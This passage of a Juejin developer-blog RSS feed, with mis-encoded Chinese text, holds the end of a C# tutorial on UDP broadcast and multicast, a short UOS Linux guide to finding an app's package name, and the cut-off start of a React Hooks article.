 Â  Â //é»˜è®¤ç½‘å¡IP
 Â  Â IPEndPoint <span class="hljs-attr">allIPEndPoint</span> = new IPEndPoint(IPAddress.Parse(<span class="hljs-string">"255.255.255.255"</span>), <span class="hljs-number">666</span>)<span class="hljs-comment">;</span>

 Â  Â Byte<span class="hljs-section">[]</span> <span class="hljs-attr">sendBytes_A_all_IP1</span> = Encoding.ASCII.GetBytes(
 Â  Â  Â  Â "A say Hi to everyone in 192.168.153 ?"
 Â  Â )<span class="hljs-comment">;</span>
 Â  Â Byte<span class="hljs-section">[]</span> <span class="hljs-attr">sendBytes_C_all_IP1</span> = Encoding.ASCII.GetBytes(
 Â  Â  Â  Â "C say Hi to everyone in 192.168.153 ?"
 Â  Â )<span class="hljs-comment">;</span>

 Â  Â Byte<span class="hljs-section">[]</span> <span class="hljs-attr">sendBytes_A_all</span> = Encoding.ASCII.GetBytes(<span class="hljs-string">"A say Hi to everyone?"</span>)<span class="hljs-comment">;</span>
 Â  Â Byte<span class="hljs-section">[]</span> <span class="hljs-attr">sendBytes_C_all</span> = Encoding.ASCII.GetBytes(<span class="hljs-string">"C say Hi to everyone?"</span>)<span class="hljs-comment">;</span>
 Â  Â <span class="hljs-comment">#region å¹¿æ’­</span>

 Â  Â Console.WriteLine("å¹¿æ’­")<span class="hljs-comment">;</span>

 Â  Â udpClientA.Send(sendBytes_A_all_IP1, allIPEndPoint_IP1)<span class="hljs-comment">;</span>
 Â  Â Console.WriteLine()<span class="hljs-comment">;</span>
 Â  Â Console.WriteLine("A say Hi to 192.168.153:666")<span class="hljs-comment">;</span>
 Â  Â udpClientC.Send(sendBytes_C_all_IP1, allIPEndPoint_IP1)<span class="hljs-comment">;</span>
 Â  Â Console.WriteLine()<span class="hljs-comment">;</span>
 Â  Â Console.WriteLine("C say Hi to 192.168.153:666")<span class="hljs-comment">;</span>
 Â  Â //<span class="hljs-attr">udpClientA.EnableBroadcast</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
 Â  Â //<span class="hljs-attr">udpClientC.EnableBroadcast</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
 Â  Â var <span class="hljs-attr">a</span> = udpClientA.Send(sendBytes_A_all, allIPEndPoint)<span class="hljs-comment">;</span>
 Â  Â Console.WriteLine()<span class="hljs-comment">;</span>
 Â  Â Console.WriteLine("A say Hi to everyone:666")<span class="hljs-comment">;</span>
 Â  Â var <span class="hljs-attr">b</span> = udpClientC.Send(sendBytes_C_all, allIPEndPoint)<span class="hljs-comment">;</span>
 Â  Â Console.WriteLine()<span class="hljs-comment">;</span>
 Â  Â Console.WriteLine("C say Hi to everyone:666")<span class="hljs-comment">;</span>

 Â  Â <span class="hljs-comment">#endregion</span>
</code></pre>
<p>æœ‰äº›æ–‡ç« è¯´éœ€è¦è®¾ç½®</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">udpClientA.EnableBroadcast</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
</code></pre>
<p>ä½†æ˜¯æˆ‘å°è¯•è¿‡ï¼Œæ²¡ä»€ä¹ˆæ•ˆæœã€‚</p>
<h2 data-id="heading-3">ä¸‰ã€ç»„æ’­ï¼š</h2>
<p>Â  ç»„æ’­æ‹¥æœ‰ç‰¹æ®Šçš„åœ°å€ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino"> Â <span class="hljs-comment">//ç»„æ’­åœ°å€</span>
 Â <span class="hljs-comment">//IP ç»„æ’­é€šä¿¡å¿…é¡»ä¾èµ–äº IP å¤šæ’­åœ°å€ï¼Œåœ¨ IPv4 ä¸­å®ƒæ˜¯ä¸€ä¸ª D ç±» IP åœ°å€ï¼ŒèŒƒå›´ä» 224.0.0.0 åˆ° 239.255.255.255ï¼Œå¹¶è¢«åˆ’åˆ†ä¸ºå±€éƒ¨é“¾æ¥å¤šæ’­åœ°å€ã€é¢„ç•™å¤šæ’­åœ°å€å’Œç®¡ç†æƒé™å¤šæ’­åœ°å€3ç±»ï¼š</span>

 Â <span class="hljs-comment">//å±€éƒ¨é“¾æ¥å¤šæ’­åœ°å€èŒƒå›´åœ¨ 224.0.0.0~224.0.0.255ï¼Œè¿™æ˜¯ä¸ºè·¯ç”±åè®®å’Œå…¶å®ƒç”¨é€”ä¿ç•™çš„åœ°å€ï¼Œè·¯ç”±å™¨å¹¶ä¸è½¬å‘å±äºæ­¤èŒƒå›´çš„IPåŒ…ï¼›</span>

 Â <span class="hljs-comment">//é¢„ç•™å¤šæ’­åœ°å€ä¸º 224.0.1.0~238.255.255.255ï¼Œå¯ç”¨äºå…¨çƒèŒƒå›´ï¼ˆå¦‚Internetï¼‰æˆ–ç½‘ç»œåè®®ï¼›</span>

 Â <span class="hljs-comment">//ç®¡ç†æƒé™å¤šæ’­åœ°å€ä¸º 239.0.0.0~239.255.255.255ï¼Œå¯ä¾›ç»„ç»‡å†…éƒ¨ä½¿ç”¨ï¼Œç±»ä¼¼äºç§æœ‰ IP åœ°å€ï¼Œä¸èƒ½ç”¨äº Internetï¼Œå¯é™åˆ¶å¤šæ’­èŒƒå›´ã€‚</span>
</code></pre>
<p>æµ‹è¯•ä»£ç ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"> Â  Â Byte<span class="hljs-section">[]</span> <span class="hljs-attr">sendBytes_multi</span> = Encoding.ASCII.GetBytes(<span class="hljs-string">"Gruop 224.0.1.0 say Hi"</span>)<span class="hljs-comment">;</span>

 Â  Â IPAddress <span class="hljs-attr">multiCastIP</span> = IPAddress.Parse(<span class="hljs-string">"224.0.1.0"</span>)<span class="hljs-comment">;</span>

 Â  Â <span class="hljs-comment">#region ç»„æ’­</span>

 Â  Â Console.WriteLine("ç»„æ’­")<span class="hljs-comment">;</span>

 Â  Â UdpClient <span class="hljs-attr">multiRev_D</span> = new UdpClient()<span class="hljs-comment">;</span>

 Â  Â multiRev_D.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true)<span class="hljs-comment">;</span>

 Â  Â multiRev_D.Client.Bind(new IPEndPoint(IPAddress.Any,777))<span class="hljs-comment">;</span>

 Â  Â multiRev_D.JoinMulticastGroup(multiCastIP)<span class="hljs-comment">;</span>


 Â  Â UdpClient <span class="hljs-attr">multiRev_E</span> = new UdpClient()<span class="hljs-comment">;</span>


 Â  Â multiRev_E.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true)<span class="hljs-comment">;</span>

 Â  Â multiRev_E.Client.Bind(new IPEndPoint(IPAddress.Any, 777))<span class="hljs-comment">;</span>

 Â  Â multiRev_E.JoinMulticastGroup(multiCastIP)<span class="hljs-comment">;</span>

 Â  Â //æ¥å—ç»„æ’­ä¿¡æ¯

 Â  Â Task.Run(() =&gt;
 Â  Â {
 Â  Â  Â  Â IPEndPoint <span class="hljs-attr">multiRev_D_IPEndPoint</span> = null<span class="hljs-comment">;</span>
 Â  Â  Â  Â var <span class="hljs-attr">bytes</span> = multiRev_D.Receive(ref multiRev_D_IPEndPoint)<span class="hljs-comment">;</span>
 Â  Â  Â  Â string <span class="hljs-attr">msg</span> = Encoding.UTF8.GetString(bytes)<span class="hljs-comment">;</span>
 Â  Â  Â  Â Console.WriteLine($"multiRev_D receive: {msg} receive IPEndPoint:{multiRev_D_IPEndPoint}")<span class="hljs-comment">;</span>
 Â  Â  Â  Â Console.WriteLine()<span class="hljs-comment">;</span>
 Â  Â  Â  Â multiRev_D.DropMulticastGroup(multiCastIP)<span class="hljs-comment">;</span>
 Â  Â })<span class="hljs-comment">; </span>

 Â  Â Task.Run(() =&gt;
 Â  Â {
 Â  Â  Â  Â IPEndPoint <span class="hljs-attr">multiRev_E_IPEndPoint</span> = null<span class="hljs-comment">;</span>
 Â  Â  Â  Â var <span class="hljs-attr">bytes</span> = multiRev_E.Receive(ref multiRev_E_IPEndPoint)<span class="hljs-comment">;</span>
 Â  Â  Â  Â string <span class="hljs-attr">msg</span> = Encoding.UTF8.GetString(bytes)<span class="hljs-comment">;</span>
 Â  Â  Â  Â Console.WriteLine($"multiRev_E receive: {msg} receive IPEndPoint:{multiRev_E_IPEndPoint}")<span class="hljs-comment">;</span>
 Â  Â  Â  Â Console.WriteLine()<span class="hljs-comment">;</span>
 Â  Â  Â  Â multiRev_E.DropMulticastGroup(multiCastIP)<span class="hljs-comment">;</span>
 Â  Â })<span class="hljs-comment">;</span>

 Â  Â //å‘é€ç»„æ’­ä¿¡æ¯

 Â  Â IPEndPoint <span class="hljs-attr">multiCastIPEndPoint</span> = new IPEndPoint(multiCastIP, <span class="hljs-number">777</span>)<span class="hljs-comment">;</span>

 Â  Â UdpClient <span class="hljs-attr">sendMultiUdp</span> = new UdpClient()<span class="hljs-comment">;</span>

 Â  Â sendMultiUdp.Connect(multiCastIPEndPoint)<span class="hljs-comment">;</span>

 Â  Â sendMultiUdp.Send(sendBytes_multi)<span class="hljs-comment">;</span>
</code></pre>
<p>ä½¿ç”¨ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-built_in">Client</span>.<span class="hljs-built_in">SetSocketOption</span>(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, <span class="hljs-literal">true</span>);
</code></pre>
<p>æ˜¯ä¸ºäº†å¯ä»¥é‡å¤ä½¿ç”¨ç»‘å®šç«¯å£å·ã€‚</p>
<pre><code class="hljs language-arduino" lang="arduino">JoinMulticastGroup <span class="hljs-comment">//åŠ å…¥IPç»„</span>
DropMulticastGroup <span class="hljs-comment">//é€€å‡ºIPç»„ï¼Œåœ¨ä¸éœ€è¦æ—¶è®°å¾—é€€å‡ºï¼Œä¸ç„¶è¿˜æ˜¯ä¼šæ¥å—åˆ°æ­¤IPç»„å‘å‡ºçš„æ¶ˆæ¯</span>
</code></pre>
<p>ç»“æœï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bca9db9c42054d7e9fe1327ba14c9d7b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55yf5piv5LuW:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767920588&amp;x-signature=DNE0iUKhE70wWX%2BXpMmYQnWhZjI%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-4">æ³¨æ„ï¼š</h2>
<p>ç»„æ’­æ›´å¤šæ³¨æ„äº‹é¡¹ï¼Œå‚è€ƒé“¾æ¥ï¼š</p>
<pre><code class="hljs language-perl" lang="perl">https:<span class="hljs-regexp">//</span>blog.lindexi.com/post/C-dotnet-core-%E5%B1%8<span class="hljs-number">0</span>%E5%<span class="hljs-number">9</span>F%<span class="hljs-number">9</span>F%E7%BD%91%E7%BB%84%E6%92%AD%E6%96%B9%E6%B3%95.html
</code></pre>
<h2 data-id="heading-5">å››ã€UDPæ¥å—</h2>
<p>Â  Â ä½¿ç”¨</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-built_in">byte</span>[] <span class="hljs-title">Receive</span>(<span class="hljs-params"><span class="hljs-keyword">ref</span> System.Net.IPEndPoint? remoteEP</span>)</span>;
</code></pre>
<p>æ¥å—ï¼Œå…¶ä¸­remoteEPå‚æ•°ä¸ºè¿œç«¯IPã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/39fa430c24684330a2f1599d60d7c515~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55yf5piv5LuW:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767920588&amp;x-signature=R79jH%2BFRTN%2BnuBz8Y8bpP84Y7pA%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[uosåŸºç¡€ åº”ç”¨å•†åº— æŸ¥çœ‹åº”ç”¨ç¨‹åºçš„åŒ…å]]></title>    <link>https://juejin.cn/post/7589940913767972899</link>    <guid>https://juejin.cn/post/7589940913767972899</guid>    <pubDate>2026-01-02T02:26:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589940913767972899" data-draft-id="7590104561474748468" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="uosåŸºç¡€ åº”ç”¨å•†åº— æŸ¥çœ‹åº”ç”¨ç¨‹åºçš„åŒ…å"/> <meta itemprop="keywords" content="è¿ç»´"/> <meta itemprop="datePublished" content="2026-01-02T02:26:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è¡Œåˆå¿ƒ"/> <meta itemprop="url" content="https://juejin.cn/user/4081803083395527"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            uosåŸºç¡€ åº”ç”¨å•†åº— æŸ¥çœ‹åº”ç”¨ç¨‹åºçš„åŒ…å
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4081803083395527/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è¡Œåˆå¿ƒ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T02:26:12.000Z" title="Fri Jan 02 2026 02:26:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>ç»Ÿä¿¡æ¡Œé¢æ“ä½œç³»ç»Ÿä¸“ä¸šç‰ˆV20ï¼ˆ1070ï¼‰<br/>
Linux uos 5.10.97-arm64-desktop</p>
</blockquote>
<h3 data-id="heading-0">uosåŸºç¡€ åº”ç”¨å•†åº— æŸ¥çœ‹åº”ç”¨ç¨‹åºçš„åŒ…å</h3>
<ul>
<li>åº”ç”¨å•†åº—</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/89022b9278014fb4aa3ea3c6d5ee2e4b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KGM5Yid5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767925571&amp;x-signature=A25fqcHGlhmO2FzKH1Dyy2OntMo%3D" alt="uos-appstore-ckbm-1.png" loading="lazy"/></p>
<ul>
<li>åº”ç”¨ç®¡ç†</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c111f8f92f584a0db1315f6f513a6669~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KGM5Yid5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767925571&amp;x-signature=yvBetvJ2xPOMh46oZCdRkYbPN5w%3D" alt="uos-appstore-ckbm-2.png" loading="lazy"/></p>
<ul>
<li>ä»¥"å­—ä½“ç®¡ç†å™¨"ä¸ºä¾‹ï¼Œç‚¹å‡» ç‰ˆæœ¬ å³ä¾§çš„åŒå‘ç®­å¤´</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8e455d6a9ab3420da1555ddd58752f99~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KGM5Yid5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767925571&amp;x-signature=HFM%2FCbMZ6byP6nyFM81IC5R21vo%3D" alt="uos-appstore-ckbm-3.png" loading="lazy"/></p>
<ul>
<li>å‡ºç°åŒ…åï¼Œå¦‚éœ€ä½¿ç”¨ï¼Œå¤åˆ¶å³å¯ã€‚</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/22656cd712564bf2ade3d104d0ee7769~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KGM5Yid5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767925571&amp;x-signature=De5MUAKoFRtypX4jG8GhFqrOeA4%3D" alt="uos-appstore-ckbm-4.png" loading="lazy"/></p>
<ul>
<li>ç›´æ¥è¾“åŒ…åçš„è¯ï¼Œä¼šæŠ¥é”™ï¼Œè¿™æ˜¯æ­£å¸¸çš„ã€‚</li>
</ul>
<pre><code class="hljs language-c" lang="c">root@uos:~<span class="hljs-meta"># deepin-font-manager</span>
DCopyFilesManager export max thread count =  <span class="hljs-number">12</span> , install max thread count =  <span class="hljs-number">12</span>
<span class="hljs-string">"[PerformanceMonitor]"</span> <span class="hljs-string">"2025-12-01T15:54:53.704"</span> start to initialize app
Authorization required, but no authorization protocol specified
Authorization required, but no authorization protocol specified
qt.qpa.screen: QXcbConnection: Could not connect to display :<span class="hljs-number">1</span>
Could not connect to any X display.
root@uos:~# 
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React Hooks ï¼šuseRefã€useState ä¸å—æ§/éå—æ§ç»„ä»¶å…¨è§£æ]]></title>    <link>https://juejin.cn/post/7589935326782472226</link>    <guid>https://juejin.cn/post/7589935326782472226</guid>    <pubDate>2026-01-01T17:25:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589935326782472226" data-draft-id="7589916567876075562" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React Hooks ï¼šuseRefã€useState ä¸å—æ§/éå—æ§ç»„ä»¶å…¨è§£æ"/> <meta itemprop="keywords" content="React.js,å‰ç«¯,å‰ç«¯æ¡†æ¶"/> <meta itemprop="datePublished" content="2026-01-01T17:25:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="xiaoxue_"/> <meta itemprop="url" content="https://juejin.cn/user/4065372122398027"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React Hooks ï¼šuseRefã€useState ä¸å—æ§/éå—æ§ç»„ä»¶å…¨è§£æ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4065372122398027/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    xiaoxue_
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T17:25:12.000Z" title="Thu Jan 01 2026 17:25:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»11åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body 